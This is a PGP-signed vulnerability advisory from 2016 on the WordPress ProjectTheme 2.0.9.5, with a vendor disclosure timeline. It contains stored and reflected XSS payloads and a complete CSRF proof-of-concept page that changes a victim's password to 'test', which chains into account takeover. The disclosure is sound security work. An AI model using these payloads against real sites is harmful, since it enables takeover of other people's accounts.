@@ -1,0 +1,148 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
+
+
+=== LSE Leading Security Experts GmbH - Security Advisory 2016-01-01 ===
+
+Wordpress ProjectTheme Multiple Vulnerabilities
+- - ------------------------------------------------------------
+
+Affected Version
+================
+Project Theme: 2.0.9.5
+
+Problem Overview
+================
+Technical Risk: high
+Likelihood of Exploitation: low
+Vendor: http://sitemile.com/
+Credits: LSE Leading Security Experts GmbH employee Tim Herres
+Advisory: https://www.lsexperts.de/advisories/lse-2016-01-01.txt
+Advisory Status: public
+CVE-Number: [NA yet]
+
+Problem Impact
+==============
+During an internal code review multiple vulnerabilities were identified.
+The whole application misses input validation and output encoding. This means user supplied input is inserted in a unsafe way.
+This could allow a remote attacker to easily compromise user accounts. 
+
+Example:
+An authenticated user sends a private message to another user. 
+When the attacker injects JavaScript Code, it will automatically call the CSRF Proc below.
+The only necessary information is the user id, which can be identified easily, see below.
+If the other user opens the private message menu, the JavaScript code gets executed and the Password will be changed. It is not necessary to open the message.
+Now the attacker can access the account using the new password.
+
+Problem Description
+===================
+The following findings are only examples, the whole application should be reviewed for similar vulnerabilities.
+
+#Stored Cross Site Scripting:
+Creating a new project http://[URL]/post-new/? in the project title and description field.
+Insert JavaScript code inside the project message board:
+POST /?get_message_board=34 HTTP/1.1
+sumbit_message=1&my_message=TestMessagBoard<script>alert("stored_xss")</script>
+Also in the private message in the subject or in the message field. The payload in the Subject will be executed, if the user opens the private message list.
+
+#Reflected Cross Site Scripting:
+http://[IP]/advanced-search/?term=asdf&%22%3E%3Cscript%3Ealert%2811%29%3C%2fscript%3E
+
+# No protection against Cross Site Request Forgery Attacks
+There is no Cross Site Request Forgery protection.
+Also the user password can be changed without knowledge of the current password.
+A possible CSRF attack form, which will change the users password to "test":
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://[ip]/my-account/personal-information/", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarywXBZovhmb3VnFJdz");
+        xhr.setRequestHeader("Accept-Language", "de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4");
+        xhr.withCredentials = true;
+        var body = "------WebKitFormBoundarywXBZovhmb3VnFJdz\r\n" + 
+          "Content-Disposition: form-data; name=\"project_location_cat\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundarywXBZovhmb3VnFJdz\r\n" + 
+          "Content-Disposition: form-data; name=\"user_city\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundarywXBZovhmb3VnFJdz\r\n" + 
+          "Content-Disposition: form-data; name=\"user_description\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundarywXBZovhmb3VnFJdz\r\n" + 
+          "Content-Disposition: form-data; name=\"password\"\r\n" + 
+          "\r\n" + 
+          "test\r\n" + 
+          "------WebKitFormBoundarywXBZovhmb3VnFJdz\r\n" + 
+          "Content-Disposition: form-data; name=\"reppassword\"\r\n" + 
+          "\r\n" + 
+          "test\r\n" + 
+          "------WebKitFormBoundarywXBZovhmb3VnFJdz\r\n" + 
+          "Content-Disposition: form-data; name=\"avatar\"; filename=\"\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundarywXBZovhmb3VnFJdz\r\n" + 
+          "Content-Disposition: form-data; name=\"save-info\"\r\n" + 
+          "\r\n" + 
+          "Save\r\n" + 
+          "------WebKitFormBoundarywXBZovhmb3VnFJdz\r\n" + 
+          "Content-Disposition: form-data; name=\"user_id\"\r\n" + 
+          "\r\n" + 
+          "2\r\n" + 
+          "------WebKitFormBoundarywXBZovhmb3VnFJdz--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+#Getting user id
+In a published project there is a button contact project owner with the corresponding UID --> url: http://[IP]/my-account/private-messages/?rdr=&pg=send&uid=1&pid=34.
+Also a mouseover in the user profile (Feedback) will reveal the userid.
+
+
+Temporary Workaround and Fix
+============================
+No fix
+
+History
+=======
+2015-12-20  Problem discovery during code review
+2016-01-12  Vendor contacted
+2016-01-12  Vendor response (check in progress)
+2016-01-26  Vendor contacted (asked for status update)
+2016-01-26  Vendor reponse (check in progress)
+2016-02-05  Vendor contacted (advisory will be released in 30 days)
+2016-03-07  Vendor contacted (asked for last status update)
+2016-03-07  Vendor response (vulnerabilities should be fixed in the last update 2.0.9.7 on 1st march 2016, not verified by the LSE)
+2016-03-08  Advisory release
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2
+
+iQIcBAEBCAAGBQJW3ojFAAoJEDgSCSGZ4yd8iQIQAOYTS8WaW0Tkw8JMwssV/N8F
+8O6tk4BYAkBbaMhk8rPBZBKcny7hTUiCsfLr7PYby9O3hcLmGMajhhyYg+5jjw1x
+XUQc6dsER9UAj7OukUHxqJH2trQvcQfCOQUx7iNgV4lHNfpOGDOBVvZYA/YNE6uF
+mUuyoGDdHlE3jE9WVGamsy2t5lrY5HOYXK6ZJkAv79MkeM6Dzdt2VXdZmN4UHzec
+NkAm0fvML143dcBt3BsuCsE5AhfBJGOesAUMkE7Z29HTux1fBrNyYs4KhzumSALy
+2I7h4WTozJMXBufEZkvqcGA6ikWATr31SzaUGjzyko96whegkNizJhpFqbAwtlZZ
+tz32tXjf97c+3mmpKvkHqsln2oPWJrfAEV2q96SlOuevFo38uJSYb31NNZrtfx7I
+5FoXr8ZgR98VIxeQcceF021JvM95J0ciLWWLkRYoE3VP1pQz9frrX7QfUU5+QrqT
+gCC49pWbeK00aVdlqgc3oquJd8kk4fVZ59HOaNJldQh2BM9isFscbQ8fDmYJna/K
+0VzgaoItc0OBR4hLywPi2MEVvHQm3r7Qe4JGsnr1imRg7i84GfbsuYsG8UH/FkDP
+4nWQnKcZFTrNzTNQdsvho/P6/d3Efp5zJr+GVkNwI4242yAYHaAfcfy+DzK7vDH+
+b3FqvVBebtLXMXwgRwx0
+=NlIz
+-----END PGP SIGNATURE-----
